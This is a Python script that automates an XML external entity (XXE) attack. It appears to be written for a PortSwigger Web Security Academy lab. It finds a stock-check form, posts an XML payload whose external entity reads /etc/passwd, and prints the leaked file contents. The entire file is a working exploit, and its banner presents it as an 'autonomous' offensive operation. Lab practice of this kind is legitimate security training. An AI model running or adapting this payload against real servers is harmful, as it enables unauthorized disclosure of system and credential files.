#!/usr/bin/env python3
# === XXE Local File Disclosure Exploit (PortSwigger) ===

import requests
from bs4 import BeautifulSoup
import sys

def banner():
    print("\n=== 🧨 XXE File Disclosure via External Entities ===")
    print(">>> Shadow Junior 😈 | GANGA Ops Autonomous Mode")
    print(">>> Target File: /etc/passwd\n")

def get_lab_url():
    try:
        url = input("🔗 Enter the full lab URL (e.g., https://xyz.web-security-academy.net): ").strip()
        if not url.startswith("http"):
            raise ValueError("Invalid URL format.")
        return url.rstrip('/')
    except Exception as e:
        print(f"[!] Input Error: {e}")
        sys.exit(1)

def get_stock_check_url(base_url):
    print("[*] Discovering stock check path...")
    try:
        r = requests.get(f"{base_url}/product?productId=1", timeout=10)
        soup = BeautifulSoup(r.text, "html.parser")
        form = soup.find("form")
        action = form.get("action")
        if not action:
            raise Exception("No form action found.")
        return base_url + action
    except Exception as e:
        print(f"[!] Failed to resolve form action: {e}")
        sys.exit(1)

def craft_xxe_payload():
    return """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>"""

def send_payload(post_url, xml_payload):
    headers = {
        "Content-Type": "application/xml"
    }
    try:
        response = requests.post(post_url, data=xml_payload, headers=headers, timeout=10)
        return response.text
    except Exception as e:
        print(f"[!] Request error: {e}")
        return None

def extract_passwd(response):
    if "/bin/bash" in response or "root:x" in response:
        print("[✓] /etc/passwd contents leaked successfully!\n")
        snippet = response.split("Invalid product ID:")[-1]
        print("------ /etc/passwd Snippet ------")
        print(snippet[:500])  # Print first 500 chars
        print("---------------------------------")
    else:
        print("[✗] No /etc/passwd data found in response.")

def main():
    banner()
    base_url = get_lab_url()
    post_url = get_stock_check_url(base_url)
    payload = craft_xxe_payload()
    print(f"[+] Sending XXE payload to: {post_url}")
    response = send_payload(post_url, payload)

    if response:
        extract_passwd(response)
    else:
        print("[!] No response received.")

if __name__ == "__main__":
    main()
